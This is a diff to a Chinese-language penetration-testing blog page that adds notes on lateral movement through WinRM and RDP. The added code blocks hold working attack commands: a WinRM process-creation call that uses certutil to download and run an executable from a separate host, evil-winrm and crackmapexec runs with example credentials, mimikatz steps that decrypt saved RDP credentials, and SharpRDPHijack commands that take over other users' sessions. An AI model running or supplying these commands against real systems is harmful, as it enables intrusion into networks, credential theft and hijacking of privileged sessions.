@@ -197,6 +197,11 @@
         <li><a href="#smb横向易被发现">SMB横向（易被发现）</a></li>
         <li><a href="#dcom横向不易被发现">DCOM横向（不易被发现）</a></li>
         <li><a href="#wmismbdcom横向的区别">WMI、SMB、DCOM横向的区别</a></li>
+      </ul>
+    </li>
+    <li><a href="#winrm横向">winrm横向</a>
+      <ul>
+        <li><a href="#rdp横向">RDP横向</a></li>
         <li><a href="#利用低速密码枚举手段">利用低速密码枚举手段</a></li>
       </ul>
     </li>
@@ -591,7 +596,76 @@ WMI、SMB、DCOM横向的区别
 </span></span><span class="line"><span class="cl">    必开：动态高位端口（49152~65535，DCOM数据传输端口）
 </span></span><span class="line"><span class="cl">    高版本系统若通过组策略限制DCOM端口范围，需放通对应区间
 </span></span></code></pre></div><p>一般情况下，杀软中存在默认共享访问和RPC调用的限制，所以，若目标有杀软，以上这些路基本就堵死了。<img src="../../images/image-20260501211511681.png" alt="image-20260501211511681"></p>
-<h3 id="利用低速密码枚举手段">
+<h2 id="winrm横向">
+<a class="header-anchor" href="#winrm%e6%a8%aa%e5%90%91"></a>
+winrm横向
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">简介：
+</span></span><span class="line"><span class="cl">	WinRM(Windows Remote Management)，通过WS-management协议来实现管理远程主机，对应的端口是5985和5986（带ssl），在Windows 2008以上的版本才会自启动。
+</span></span><span class="line"><span class="cl">	WinRS(Windows Remote Shell，Windows 远程命令行)是一款Windows提供用于远程管理WinRM服务的客户端工具。
+</span></span><span class="line"><span class="cl">利用条件：
+</span></span><span class="line"><span class="cl">1、Win 2012之前利用需要手动开启winRM ，在win 2012之后(包括win 2012)的版本是默认开启的， 
+</span></span><span class="line"><span class="cl">2、防火墙对5986、5985端口开放。
+</span></span><span class="line"><span class="cl">与以上三种横向移动方式的优势：**默认不需要本地管理员权限**
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	开启 WinRM 服务
+</span></span><span class="line"><span class="cl">    powershell &#34;Enable-PSRemoting -force&#34;
+</span></span><span class="line"><span class="cl">    配置 WinRM 服务
+</span></span><span class="line"><span class="cl">    winrm quickconfig
+</span></span><span class="line"><span class="cl">    将指定 IP 加入 TrustedHosts，否则无法使用 Winrm 连接远程主机
+</span></span><span class="line"><span class="cl">    winrm set winrm/config/client @{TrustedHosts=&#34;IP&#34;} 
+</span></span><span class="line"><span class="cl">    测试远程主机是否开启 WinRM 服务
+</span></span><span class="line"><span class="cl">    Test-WsMan IP
+</span></span><span class="line"><span class="cl">winrs和winrm不支持hash
+</span></span><span class="line"><span class="cl">通过Winrs执行命令：winrs -r:IP -u:USER -p:PASS &#34;whoami&#34;
+</span></span><span class="line"><span class="cl">通过Winrs获取远程主机的交互式 Shell：winrs -r:IP -u:USER -p:PASS cmd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">通过原生WinRM执行命令（无需代理）
+</span></span><span class="line"><span class="cl">    winrm invoke Create wmicimv2/win32_process @{CommandLine=&#34;C:\Beacon.exe&#34;} -r:http://IP:5985 -u:USER -p:PASS
+</span></span><span class="line"><span class="cl">    winrm invoke Create wmicimv2/win32_process @{CommandLine=&#34;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/5566.exe 5566.exe &amp; 5566.exe&#34;} -r:sqlserver -u:sqlserver\administrator -p:admin!@#45
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">工具crackmapexec或evil-winrm等（支持HASH但实战场景下要走socks代理）
+</span></span><span class="line"><span class="cl">    proxychains4 evil-winrm -i 192.168.3.32 -u administrator -p &#39;admin!@#45&#39; 
+</span></span><span class="line"><span class="cl">    proxychains4 crackmapexec winrm 192.168.3.32 -u administrator -p &#39;admin!@#45&#39; --local-auth -x &#34;whoami&#34;
+</span></span><span class="line"><span class="cl">    https://github.com/Hackplayers/evil-winrm
+</span></span><span class="line"><span class="cl">    https://github.com/byt3bl33d3r/CrackMapExec
+</span></span></code></pre></div><h3 id="rdp横向">
+<a class="header-anchor" href="#rdp%e6%a8%aa%e5%90%91"></a>
+RDP横向
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">远程桌面服务 支持明文或HASH连接
+</span></span><span class="line"><span class="cl">条件：对方开启RDP服务
+</span></span><span class="line"><span class="cl">连接执行：
+</span></span><span class="line"><span class="cl">    明文连接：适用于Socks代理后
+</span></span><span class="line"><span class="cl">        mstsc /console /v:192.168.3.32 /admin （mstsc为windwos原生命令，连接时会在当前主机弹出图形界面，易被发现，因此最好采用代理节点进行连接的方式）
+</span></span><span class="line"><span class="cl">        proxychains4 xfreerdp3 /u:administrator /p:&#39;admin!@#45&#39; /v:192.168.3.32 +clipboard /cert:ignore /sec:rdp（幸福reerdp为linux中自带rdp-client，支持hash）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HASH连接:适用于Socks代理后
+</span></span><span class="line"><span class="cl">	实际情况下：NLA网络级别认证会导致HASH通讯失败，此时可采取下面的方式。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    1、RDP历史凭据提取（RDP连接历史保存记录，使用mstsc连接时勾选&#34;记住我的凭据&#34;时会记录）
+</span></span><span class="line"><span class="cl">    	#历史凭据本身是被加密，需要masterkey解密
+</span></span><span class="line"><span class="cl">    https://github.com/GhostPack/SharpDPAPI
+</span></span><span class="line"><span class="cl">    SharpDPAPI.exe credentials  #提取本机上凭据文件保存的位置，以及对应的masterkey的GUID。
+</span></span><span class="line"><span class="cl">    privilege::debug
+</span></span><span class="line"><span class="cl">    sekurlsa::dpapi   #提取所有masterkey，依照GUID，找到对应的masterkey。
+</span></span><span class="line"><span class="cl">    mimikatz dpapi::cred /in:&#34;C:\Users\Administrator\AppData\Local\Microsoft\Credentials\5FBB2585F99BA05366F08E52F1C1740B&#34; /masterkey:3ca7fa8cde1b8d7f5dbc7c576edb83553f25602238513d0c38b016585ea873dfe0fd08727ec6e10c245dd0dcd414fd96354aeaf30671705335daffec96bd21d4  #最后利用mimikatz读取，可获取明文口令。
+</span></span><span class="line"><span class="cl">    #注意：此方法需要具备管理员权限。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    2、RDP劫持（对于实战场景作用不大）
+</span></span><span class="line"><span class="cl">    	使用场景：
+</span></span><span class="line"><span class="cl">    		1.近期有两个或以上账户登录，存在会话记录（任务管理器--&gt;用户）
+</span></span><span class="line"><span class="cl">    		2.获取本机管理权限。
+</span></span><span class="line"><span class="cl">    	作用和局限：
+</span></span><span class="line"><span class="cl">    		1.无密码会话接管：若以 SYSTEM 权限运行，可直接劫持目标主机上已断开的高权限用户（如域管理员、本地管理员）遗留的RDP会话，直接进入该用户的桌面环境，继承其权限，无需知道用户密码。
+</span></span><span class="line"><span class="cl">			2.会话重定向：可将目标会话重定向到本地控制台（物理显示器输出）或当前操作会话，实现无缝接入。
+</span></span><span class="line"><span class="cl">			3.（实验性）影子监控：尝试通过RDP Shadow功能静默监控目标会话操作，不中断用户操作（稳定性依赖系统版本）。
+</span></span><span class="line"><span class="cl">			4.GUI显示。
+</span></span><span class="line"><span class="cl">    https://github.com/bohops/SharpRDPHijack
+</span></span><span class="line"><span class="cl">    SharpRDPHijack.exe --tsquery=localhost
+</span></span><span class="line"><span class="cl">    SharpRDPHijack.exe --tsquery=目标机器名
+</span></span><span class="line"><span class="cl">    劫持会话（图形化，影子模式）
+</span></span><span class="line"><span class="cl">    SharpRDPHijack.exe --session=会话ID
+</span></span><span class="line"><span class="cl">    SharpRDPHijack.exe --session=会话ID --shadow
+</span></span></code></pre></div><h3 id="利用低速密码枚举手段">
 <a class="header-anchor" href="#%e5%88%a9%e7%94%a8%e4%bd%8e%e9%80%9f%e5%af%86%e7%a0%81%e6%9e%9a%e4%b8%be%e6%89%8b%e6%ae%b5"></a>
 利用低速密码枚举手段
 </h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">C:\Users\XXXX&gt;net accounts   # 通过此命令查看锁定阈值，已调整枚举频率
@@ -673,10 +747,10 @@ WMI、SMB、DCOM横向的区别
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;87.4k</span
+          >&nbsp;88.7k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;03:39</span>
+        <span class="icon-coffee">&nbsp;03:41</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -713,6 +787,11 @@ WMI、SMB、DCOM横向的区别
         <li><a href="#smb横向易被发现">SMB横向（易被发现）</a></li>
         <li><a href="#dcom横向不易被发现">DCOM横向（不易被发现）</a></li>
         <li><a href="#wmismbdcom横向的区别">WMI、SMB、DCOM横向的区别</a></li>
+      </ul>
+    </li>
+    <li><a href="#winrm横向">winrm横向</a>
+      <ul>
+        <li><a href="#rdp横向">RDP横向</a></li>
         <li><a href="#利用低速密码枚举手段">利用低速密码枚举手段</a></li>
       </ul>
     </li>
